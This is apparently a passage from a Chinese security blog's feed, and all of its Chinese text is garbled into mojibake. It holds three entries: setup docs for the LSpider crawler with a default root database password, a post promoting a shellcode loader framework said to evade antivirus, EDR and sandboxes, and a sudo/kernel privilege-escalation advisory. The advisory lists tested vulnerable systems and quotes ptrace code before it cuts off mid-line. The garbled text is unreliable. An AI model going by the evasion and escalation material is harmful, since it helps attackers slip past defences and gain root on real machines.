id="LSpiderçš„æœ€ä½³å®è·µæ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#LSpiderçš„æœ€ä½³å®è·µæ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="LSpiderçš„æœ€ä½³å®è·µæ˜¯ä»€ä¹ˆï¼Ÿ"></a>LSpiderçš„æœ€ä½³å®è·µæ˜¯ä»€ä¹ˆï¼Ÿ</h2><p>æœåŠ¡å™¨1ï¼ˆ2c4gä»¥ä¸Šï¼‰: Nginx + Mysql + Mysqlç®¡ç†ç•Œé¢ï¼ˆphpmyadminï¼‰<br>å°†è¢«åŠ¨æ‰«æå™¨çš„è¾“å‡ºä½ç½®è®¾ç½®ä¸ºwebè·¯å¾„ä¸‹ï¼Œè¿™æ ·å¯ä»¥é€šè¿‡WebåŒæ—¶ç®¡ç†ç»“æœä»¥åŠä»»åŠ¡ã€‚<br>LSpideréƒ¨ç½²5çº¿ç¨‹ä»¥ä¸Šï¼Œè®¾ç½®ä»£ç†è¿æ¥è¢«åŠ¨æ‰«æå™¨ï¼ˆè¢«åŠ¨æ‰«æå™¨å¯ä»¥è®¾ç½®ä¸“é—¨çš„æ¼æ‰«ä»£ç†ï¼‰<br>æœåŠ¡å™¨2ï¼ˆéå¿…è¦ï¼Œä½†å¦‚æœéƒ¨ç½²åœ¨æœåŠ¡å™¨1ï¼Œé‚£ä¹ˆå°±éœ€è¦æ›´å¥½çš„é…ç½®ï¼‰ï¼šRabbitMQ</p><h2 id="è¿˜æœ‰ä»€ä¹ˆé—®é¢˜ï¼Ÿ"><a href="#è¿˜æœ‰ä»€ä¹ˆé—®é¢˜ï¼Ÿ" class="headerlink" title="è¿˜æœ‰ä»€ä¹ˆé—®é¢˜ï¼Ÿ"></a>è¿˜æœ‰ä»€ä¹ˆé—®é¢˜ï¼Ÿ</h2><p>LSpiderä»è®¾è®¡ä¹‹åˆæ˜¯ä¸ºäº†é…åˆåƒxrayè¿™ç§è¢«åŠ¨æ‰«æå™¨è€Œè¯ç”Ÿçš„ï¼Œä½†å¯æƒœçš„æ˜¯ï¼Œåœ¨å·¥å…·å‘å±•çš„è¿‡ç¨‹ä¸­ï¼Œæ·±åˆ»è®¤è¯†åˆ°çˆ¬è™«æ˜¯æ— æ³•å’Œè¢«åŠ¨æ‰«æå™¨æ‹†åˆ†å¼€æ¥çš„ã€‚<br>å¼ºè¡Œå°†åº”è¯¥åœ¨è¢«åŠ¨æ‰«æå™¨å®ç°çš„åŠŸèƒ½åœ¨çˆ¬è™«ç«¯å®ç°ç®€ç›´æ˜¯èˆæœ¬é€æœ«ï¼Œæ‰€ä»¥æˆ‘ä»¬å‘èµ·äº†å¦ä¸€ä¸ªè¢«åŠ¨æ‰«æå™¨é¡¹ç›®ï¼Œå¦‚æœæœ‰æœºä¼šï¼Œåç»­è¿˜ä¼šå¼€æºå‡ºæ¥ç»™å¤§å®¶ã€‚</p><h2 id="è®¾è®¡æ€è·¯ï¼Ÿ"><a href="#è®¾è®¡æ€è·¯ï¼Ÿ" class="headerlink" title="è®¾è®¡æ€è·¯ï¼Ÿ"></a>è®¾è®¡æ€è·¯ï¼Ÿ</h2><p>è¯¦æƒ…è¯·é˜…è¯»ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;lorexxar.cn&#x2F;2021&#x2F;01&#x2F;28&#x2F;lspider-design&#x2F;</span><br></pre></td></tr></table></figure><h1 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h1><p>å®‰è£…ä¸ä½¿ç”¨å‚è€ƒï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;knownsec&#x2F;LSpider&#x2F;blob&#x2F;master&#x2F;docs&#x2F;init.md</span><br></pre></td></tr></table></figure><p>ä½ å¯ä»¥é€šè¿‡ä¸‹é¢çš„å‘½ä»¤æ¥æµ‹è¯•æ˜¯å¦å®‰è£…æˆåŠŸ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 manage.py SpiderCoreBackendStart --test</span><br></pre></td></tr></table></figure><p>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œä»¥ä¸‹è„šæœ¬å¯èƒ½ä¼šæ¶‰åŠåˆ°é¡¹ç›®è·¯å¾„å½±å“ï¼Œä½¿ç”¨å‰è¯·ä¿®æ”¹ç›¸åº”çš„é…ç½®</p><p>å¯åŠ¨LSpider webhookï¼ˆé»˜è®¤ç«¯å£2062ï¼‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;lspider_webhook.sh</span><br></pre></td></tr></table></figure><p>å¯åŠ¨LSpider</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;lspider_start.sh</span><br></pre></td></tr></table></figure><p>å®Œå…¨å…³é—­LSpider</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;lspider_stop.sh</span><br></pre></td></tr></table></figure><p>å¯åŠ¨è¢«åŠ¨æ‰«æå™¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;xray.sh</span><br></pre></td></tr></table></figure><h2 id="ä¸€äº›å…³é”®çš„é…ç½®"><a href="#ä¸€äº›å…³é”®çš„é…ç½®" class="headerlink" title="ä¸€äº›å…³é”®çš„é…ç½®"></a>ä¸€äº›å…³é”®çš„é…ç½®</h2><p>Mysqlé…ç½®<br>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœdjangoç‰ˆæœ¬å˜åŒ–ï¼Œè¿™éƒ¨åˆ†é…ç½®å¯èƒ½å‘ç”Ÿå˜åŒ–</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">DATABASES &#x3D; &#123;</span><br><span class="line">    &#39;default&#39;: &#123;</span><br><span class="line">        &#39;ENGINE&#39;: &#39;django.db.backends.mysql&#39;,</span><br><span class="line">        &#39;NAME&#39;: &#39;LSpider&#39;,</span><br><span class="line">        &#39;USER&#39;: &#39;root&#39;,</span><br><span class="line">        &#39;PASSWORD&#39;: &#39;lspider123!@#&#39;,</span><br><span class="line">        &#39;HOST&#39;: &#39;127.0.0.1&#39;,</span><br><span class="line">        &#39;PORT&#39;: &#39;3306&#39;,</span><br><span class="line">        &#39;OPTIONS&#39;: &#123;</span><br><span class="line">            &#39;init_command&#39;: &#39;SET default_storage_engine&#x3D;INNODB;SET NAMES utf8mb4&#39;,</span><br><span class="line">            &#39;charset&#39;: &#39;utf8mb4&#39;,</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><del>Chromeè®¿é—®åˆ°çš„æ–‡ä»¶å‚¨å­˜</del>ä½ç½®å·²åºŸå¼ƒï¼Œé»˜è®¤ä¸‹è½½åˆ°/dev/null</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CHROME_DOWNLOAD_PATH &#x3D; &#39;&#x2F;tmp&#x2F;lspider&#39;</span><br></pre></td></tr></table></figure><p>LIMIT_DEEPä¸ºçˆ¬è™«æ·±åº¦ï¼Œå³ä»ç›®æ ‡å¼€å§‹ç›´åˆ°ç¬¬å‡ å±‚ä¸å†ç»§ç»­ THREADPOOL_MAX_THREAD_NUM çº¿ç¨‹æ± æ•°é‡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LIMIT_DEEP &#x3D; 2</span><br><span class="line">THREADPOOL_MAX_THREAD_NUM &#x3D; 5</span><br></pre></td></tr></table></figure><p>RabbitMQé…ç½®ï¼Œå€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œå»ºè®®ä½¿ç”¨RabbitMQï¼Œå› ä¸ºåŸºäºé˜Ÿåˆ—çš„ä»»åŠ¡ç®¡ç†éå¸¸å®¹æ˜“çˆ†å†…å­˜ï¼Œæ— æ³•è§£å†³ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># rabbitmq</span><br><span class="line">RABBITMQ_IP &#x3D; &quot;&quot;</span><br><span class="line">RABBITMQ_PORT &#x3D; &quot;&quot;</span><br><span class="line">RABBITMQ_USERNAME &#x3D; &quot;&quot;</span><br><span class="line">RABBITMQ_PASSWORD &#x3D; &quot;&quot;</span><br><span class="line">RABBITMQ_VHOST &#x3D; &quot;&quot;</span><br><span class="line"></span><br><span class="line"># wheather open rabbitmq</span><br><span class="line">IS_OPEN_RABBITMQ &#x3D; True</span><br></pre></td></tr></table></figure><p>Chrome Headlessé…ç½®ï¼Œå°†è¢«åŠ¨æ‰«æå™¨çš„ä»£ç†å¡«å†™åœ¨è¿™é‡Œï¼Œå»ºè®®å¼€å¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># proxy for chrome headless</span><br><span class="line">IS_OPEN_CHROME_PROXY &#x3D; True</span><br><span class="line">CHROME_PROXY &#x3D; &#39;127.0.0.1:7777&#39;</span><br><span class="line"></span><br><span class="line">Hackerone è´¦å·é…ç½®ï¼Œåªæœ‰é…ç½®å®Œæˆä¹‹åæ‰å¯ä»¥ä½¿ç”¨Hackeroneçˆ¬è™«</span><br><span class="line"></span><br><span class="line"># for hackerone</span><br><span class="line">HACKERONE_USERNAME &#x3D; &quot;&quot;</span><br><span class="line">HACKERONE_PASSWORD &#x3D; &quot;&quot;</span><br></pre></td></tr></table></figure><p>æ˜¯å¦å¼€å¯å¾®ä¿¡æ¨é€ï¼ˆé…åˆwebhookï¼‰,ç›¸å…³é…ç½®æ˜¯æ¨é€åˆ°ä¼ä¸šå¾®ä¿¡å°ç¨‹åºçš„ã€‚<br>å…¶ä¸­ï¼Œdebugä¸ºä¼ é€ä¸€äº›debugä¿¡æ¯çš„é…ç½®ï¼ŒWECHAT_NOTICEä¸ºä¼ è¾“ç»“æœçš„é…ç½®ã€‚<br>å…¶ä¸­å„ä¸ªé…ç½®å¯ä»¥å‚è€ƒä¼ä¸šå¾®ä¿¡å°ç¨‹åºå¤„id</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># loghander</span><br><span class="line">LOGHANDER_IS_OPEN_WEIXIN &#x3D; False</span><br><span class="line"></span><br><span class="line"># for weixin</span><br><span class="line">WECHAT_NOTICE &#x3D; &#123;</span><br><span class="line">    &#39;corp_id&#39;: &#39; &#39;,</span><br><span class="line">    &#39;secret&#39;: &#39; &#39;,</span><br><span class="line">    &#39;agent_id&#39;: &#39; &#39;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">WECHAT_NOTICE_DEBUG &#x3D; &#123;</span><br><span class="line">    &#39;corp_id&#39;: &#39; &#39;,</span><br><span class="line">    &#39;secret&#39;: &#39; &#39;,</span><br><span class="line">    &#39;agent_id&#39;: &#39; &#39;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœå¼€å¯è¿™ä¸ªé…ç½®ï¼ŒChrome webdriver ä¼šä»¥éheadlessçš„æ¨¡å¼å¯åŠ¨ï¼Œä¾¿äºè°ƒè¯•ç¯å¢ƒ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># for test </span><br><span class="line">IS_TEST_ENVIRONMENT &#x3D; False</span><br></pre></td></tr></table></figure><h1 id="å¦‚ä½•é…ç½®æ‰«æä»»åŠ¡-ä»¥åŠ-å…¶ä»–çš„é…ç½®ç›¸å…³"><a href="#å¦‚ä½•é…ç½®æ‰«æä»»åŠ¡-ä»¥åŠ-å…¶ä»–çš„é…ç½®ç›¸å…³" class="headerlink" title="å¦‚ä½•é…ç½®æ‰«æä»»åŠ¡ ä»¥åŠ å…¶ä»–çš„é…ç½®ç›¸å…³"></a>å¦‚ä½•é…ç½®æ‰«æä»»åŠ¡ ä»¥åŠ å…¶ä»–çš„é…ç½®ç›¸å…³</h1><p>å…¶ä¸­åŒ…å«äº†å¦‚ä½•é…ç½®æ‰«æä»»åŠ¡ã€é‰´æƒä¿¡æ¯ã€webhookã€‚<br>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œæ–‡ä¸­æåˆ°çš„Cookieé…ç½®ï¼Œæ ¼å¼ä¸ºæµè§ˆå™¨è¯·æ±‚åŒ…å¤åˆ¶å³å¯ã€‚<br>å¦‚ä½•é…ç½®æ‰«æä»»åŠ¡ä»¥åŠå…¶ä»–çš„é…ç½®ç›¸å…³ï¼Œè¯¦æƒ…è¯·å‚è€ƒï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;knownsec&#x2F;LSpider&#x2F;blob&#x2F;master&#x2F;docs&#x2F;manage.md</span><br></pre></td></tr></table></figure><h1 id="ä½¿ç”¨å†…ç½®çš„hackeroneã€bugcrowdçˆ¬è™«è·å–ç›®æ ‡"><a href="#ä½¿ç”¨å†…ç½®çš„hackeroneã€bugcrowdçˆ¬è™«è·å–ç›®æ ‡" class="headerlink" title="ä½¿ç”¨å†…ç½®çš„hackeroneã€bugcrowdçˆ¬è™«è·å–ç›®æ ‡"></a>ä½¿ç”¨å†…ç½®çš„hackeroneã€bugcrowdçˆ¬è™«è·å–ç›®æ ‡</h1><p>ä½¿ç”¨hackeroneçˆ¬è™«ï¼Œä½ éœ€è¦é¦–å…ˆé…ç½®å¥½hackeroneè´¦å·</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 .\manage.py HackeroneSpider &#123;appname&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/108022567.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2623459159.png"></p>]]></content>
      
      
      <categories>
          
          <category> Gammaå®éªŒå®¤ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å·¥å…·æ¨é€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shellcodeå…æ€æ¡†æ¶å†…é™„SysWhispers2_x86ç›´æ¥ç³»ç»Ÿè°ƒç”¨</title>
      <link href="2021/01/29/shellcode%E5%85%8D%E6%9D%80%E6%A1%86%E6%9E%B6%E5%86%85%E9%99%84SysWhispers2_x86%E7%9B%B4%E6%8E%A5%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/"/>
      <url>2021/01/29/shellcode%E5%85%8D%E6%9D%80%E6%A1%86%E6%9E%B6%E5%86%85%E9%99%84SysWhispers2_x86%E7%9B%B4%E6%8E%A5%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>ä½œè€…ï¼šmai1zhi2<br>æ–‡ç« é“¾æ¥ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.52pojie.cn&#x2F;thread-1360548-1-1.html</span><br></pre></td></tr></table></figure><p>githubåœ°å€ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;mai1zhi2&#x2F;ShellCodeFramework</span><br></pre></td></tr></table></figure><hr><h1 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h1><p>ä¹‹å‰åˆ†æCS4çš„stageæ—¶ï¼Œæœ‰è€å“¥è®©æˆ‘å†™ä¸‹CSå…æ€ä¸Šçº¿æ–¹é¢çŸ¥è¯†ï¼Œé‚ä»‹ç»ä¹‹å‰æ‰€å†™shellcodeæ¡†æ¶ï¼Œè¯¥æ¡†æ¶çš„shellcodeæ‰§è¡Œéƒ¨åˆ†åˆ©ç”¨ç³»ç»Ÿç‰¹æ€§å’Œç›´æ¥ç³»ç»Ÿè°ƒç”¨ï¼ˆDirect System Callï¼‰æ‰§è¡Œï¼Œå¾—ä»¥å…æ€ä¸»æµæ€è½¯ï¼ˆç«ç»’ã€360å…¨éƒ¨äº§å“ã€æ¯’éœ¸ç­‰ï¼‰,è¯¥æ–¹å¼ä¹Ÿæ˜¯ä¸»æµç»•è¿‡3ç¯AVã€EDRã€æ²™ç®±çš„å¸¸ç”¨æ‰‹æ®µã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4000592497.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3409319142.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1685466589.png"></p><h1 id="é¡¹ç›®è¯´æ˜"><a href="#é¡¹ç›®è¯´æ˜" class="headerlink" title="é¡¹ç›®è¯´æ˜"></a>é¡¹ç›®è¯´æ˜</h1><p>githubåœ°å€ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;mai1zhi2&#x2F;ShellCodeFramework</span><br></pre></td></tr></table></figure><p>è¯¥æ¡†æ¶ä¸»è¦ç”±å››ä¸ªé¡¹ç›®ç»„æˆï¼š<br>GenerateShellCodeï¼šè´Ÿè´£ç”Ÿæˆç›¸å…³åŠŸèƒ½çš„shellcodeã€‚<br>EncryptShellCodeï¼šè´Ÿè´£ä»¥AES128åŠ å¯†æ‰€å°†æ‰§è¡Œçš„shellcodeã€‚<br>FunctionHashï¼šè´Ÿè´£è®¡ç®—shellä¸­æ‰€ç”¨åˆ°å‡½æ•°çš„hashå€¼ã€‚<br>XShellCodeLoaderï¼šè´Ÿè´£æ‰§è¡ŒåŠ å¯†åçš„shellcodeã€‚</p><p>è¿è¡ŒåŸç†è¯¦æƒ…ï¼Œè¯·é˜…è¯»è¿™ç¯‡æ–‡ç« ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.52pojie.cn&#x2F;thread-1360548-1-1.html</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Gammaå®éªŒå®¤ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å·¥å…·æ¨é€ </tag>
            
            <tag> shellcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2021-3156 sudoå †æ ˆæº¢å‡ºæ¼æ´é¢„è­¦</title>
      <link href="2021/01/27/CVE-2021-3156%20sudo%E5%A0%86%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E9%A2%84%E8%AD%A6/"/>
      <url>2021/01/27/CVE-2021-3156%20sudo%E5%A0%86%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E9%A2%84%E8%AD%A6/</url>
      
        <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>è¿‘æœŸCVE-2021-3156ï¼ˆsudoå †æ ˆæº¢å‡ºæ¼æ´ï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4242378657.png"></p><p>å›½å¤–çš„Qualys ç ”ç©¶å›¢é˜Ÿåœ¨ sudo å‘ç°äº†å †æº¢å‡ºæ¼æ´ï¼Œsudoæ˜¯ä¸€ç§å‡ ä¹æ— å¤„ä¸åœ¨çš„éå¸¸å®ç”¨ç¨‹åºï¼Œå¯ç”¨äºå¤§å‹ Unix ç±»æ“ä½œç³»ç»Ÿï¼ˆç±»ä¼¼ä¸windowsçš„UACåŠŸèƒ½ï¼Œä½†æ˜¯åŠŸèƒ½æ›´åŠ å¼ºå¤§ï¼Œå®ƒè¿˜å…è®¸ç”¨æˆ·ä½¿ç”¨å…¶ä»–ç”¨æˆ·çš„å®‰å…¨æƒé™è¿è¡Œç¨‹åºï¼Œä¸ä»…é™äºç®¡ç†å‘˜å“Ÿï¼‰ã€‚<br>ç¬”è€…ç«‹é©¬å»æ‰¾äº†ç›¸å…³çš„ä¿¡æ¯ï¼Œä¼å›¾æ‰¾åˆ°æ¼æ´åˆ©ç”¨expã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.qualys.com&#x2F;vulnerabilities-research&#x2F;2021&#x2F;01&#x2F;26&#x2F;cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit</span><br></pre></td></tr></table></figure><p>ç„¶åæ‰¾åˆ°è¿™ç¯‡æ–‡ç« ï¼Œåˆ†ææŒºè¯¦ç»†çš„ï¼Œä½†æ˜¯å½“æˆ‘çœ‹åˆ°æœ€å</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/481441035.png"></p><p>æˆ‘ç¬é—´æ³ªå´©ï¼Œæˆ‘kuziéƒ½è„±äº†ï¼Œä½ ç»™æˆ‘è¯´ä¸è¡Œï¼Ÿè¯´å¥½çš„åˆ†äº«ç²¾ç¥å˜?<br>ä½†æ˜¯äººå®¶å–äº§å“ï¼Œä¹Ÿæƒ…æœ‰å¯åŸå—·ã€‚<br>è‡ªå·±å»åˆ†æå†…æ ¸ä»£ç å†™expï¼Œé‚£è‚¯å®šä¸å¯èƒ½çš„ï¼Œæ²¡åˆ°è¾¾é‚£ä¸ªæ°´å‡†ï¼Œåˆä¸æ˜¯ä¸“ä¸šçš„ï¼Œç®—äº†ç®—äº†ï¼Œä¸“ä¸šçš„äº‹å°±è¯¥ä¸“ä¸šçš„äººå»å¼„ï¼Œå›½å†…çš„å¤§ä½¬ä»¬åº”è¯¥å¾ˆå¿«å°±èƒ½å†™å‡ºexpäº†<br>ä¸è¿‡æˆ‘æœ‰ç‚¹æ°”ï¼Œæœ‹å‹åˆç»™æˆ‘å‘äº†ä¸€ä¸ªCVE-2019-13272 å†…æ ¸ææƒçš„æ¼æ´ï¼Œé¡ºåˆ©æ‰¾åˆ°äº†expã€‚</p><h1 id="æ¼æ´å±å®³"><a href="#æ¼æ´å±å®³" class="headerlink" title="æ¼æ´å±å®³"></a>æ¼æ´å±å®³</h1><p>kernel 5.1.17ä¹‹å‰ç‰ˆæœ¬ä¸­å­˜åœ¨å®‰å…¨æ¼æ´ï¼Œè¯¥æ¼æ´æºäºkernel/ptrace.cæ–‡ä»¶çš„ptrace_linkæ²¡æœ‰æ­£ç¡®å¤„ç†å¯¹å‡­è¯çš„è®°å½•ï¼Œæ”»å‡»è€…å¯åˆ©ç”¨è¯¥æ¼æ´è·å–rootè®¿é—®æƒé™ã€‚</p><p>æ¼æ´æµ‹è¯•æˆåŠŸçš„ç‰ˆæœ¬ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">Ubuntu 16.04.5 kernel 4.15.0-29-generic</span><br><span class="line"></span><br><span class="line">Ubuntu 18.04.1 kernel 4.15.0-20-generic</span><br><span class="line"></span><br><span class="line">Ubuntu 19.04 kernel 5.0.0-15-generic</span><br><span class="line"></span><br><span class="line">Ubuntu Mate 18.04.2 kernel 4.18.0-15-generic</span><br><span class="line"></span><br><span class="line">Linux Mint 19 kernel 4.15.0-20-generic</span><br><span class="line"></span><br><span class="line">Xubuntu 16.04.4 kernel 4.13.0-36-generic</span><br><span class="line"></span><br><span class="line">ElementaryOS 0.4.1 4.8.0-52-generic</span><br><span class="line"></span><br><span class="line">Backbox 6 kernel 4.18.0-21-generic</span><br><span class="line"></span><br><span class="line">Parrot OS 4.5.1 kernel 4.19.0-parrot1-13t-amd64</span><br><span class="line"></span><br><span class="line">Kali kernel 4.19.0-kali5-amd64</span><br><span class="line"></span><br><span class="line">Redcore 1806 (LXQT) kernel 4.16.16-redcore</span><br><span class="line"></span><br><span class="line">MX 18.3 kernel 4.19.37-2~mx17+1</span><br><span class="line"></span><br><span class="line">RHEL 8.0 kernel 4.18.0-80.el8.x86_64</span><br><span class="line"></span><br><span class="line">Debian 9.4.0 kernel 4.9.0-6-amd64</span><br><span class="line"></span><br><span class="line">Debian 10.0.0 kernel 4.19.0-5-amd64</span><br><span class="line"></span><br><span class="line">Devuan 2.0.0 kernel 4.9.0-6-amd64</span><br><span class="line"></span><br><span class="line">SparkyLinux 5.8 kernel 4.19.0-5-amd64</span><br><span class="line"></span><br><span class="line">Fedora Workstation 30 kernel 5.0.9-301.fc30.x86_64</span><br><span class="line"></span><br><span class="line">Manjaro 18.0.3 kernel 4.19.23-1-MANJARO</span><br><span class="line"></span><br><span class="line">Mageia 6 kernel 4.9.35-desktop-1.mga6</span><br><span class="line"></span><br><span class="line">Antergos 18.7 kernel 4.17.6-1-ARCH</span><br></pre></td></tr></table></figure><h1 id="æ¼æ´åŸç†"><a href="#æ¼æ´åŸç†" class="headerlink" title="æ¼æ´åŸç†"></a>æ¼æ´åŸç†</h1><p>å½“è°ƒç”¨PTRACE_TRACEMEæ—¶ï¼Œptrace_linkå‡½æ•°å°†è·å¾—å¯¹çˆ¶è¿›ç¨‹å‡­æ®çš„RCUå¼•ç”¨ï¼Œç„¶åå°†è¯¥æŒ‡é’ˆæŒ‡å‘get_credå‡½æ•°ï¼Œé—®é¢˜å°±å‡ºåœ¨è¿™ï¼ŒPTRACE_TRACEMEè·å–çˆ¶è¿›ç¨‹çš„å‡­è¯ï¼ˆå†…æ ¸è¿˜è®°å½•äº†è·Ÿè¸ªå™¨çš„å‡­æ®ï¼‰ï¼Œé‚£ä¹ˆå°±èƒ½ä»¥çˆ¶è¿›ç¨‹çš„æƒé™æ‰§è¡Œå„ç§æ“ä½œï¼Œå¦‚æœä¸€ä¸ªä½æƒé™çš„ç”¨æˆ·è·å–äº†é«˜æƒé™çš„çˆ¶è¿›ç¨‹ï¼Œä½†æ˜¯åœ¨linuxä¸­ï¼Œptraceæ˜¯ä¸€ç§ç³»ç»Ÿè°ƒç”¨ï¼Œä¹Ÿå°±æ˜¯è¯´ä½ å¾—å…ˆæ‹¥æœ‰rootæƒé™ï¼Œæ‰èƒ½ç”¨ptraceåˆ°å…¶ä»–è¿›ç¨‹ï¼Œå¦‚æœåªæ˜¯æ™®é€šæƒé™ï¼Œåªèƒ½ptarceåˆ°å­è¿›ç¨‹ï¼ˆä¸‹é¢ä¼šåœ¨åˆ©ç”¨æ¡ä»¶ä¸­è¯´ï¼‰ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">static void ptrace_link(struct task_struct *child, struct task_struct *new_parent)</span><br><span class="line">&#123;</span><br><span class="line">  rcu_read_lock();</span><br><span class="line">  __ptrace_link(child, new_parent, __task_cred(new_parent));</span><br><span class="line">  rcu_read_unlock();</span><br><span class="line">  __ptrace_link(child, new_parent, current_cred());</span><br><span 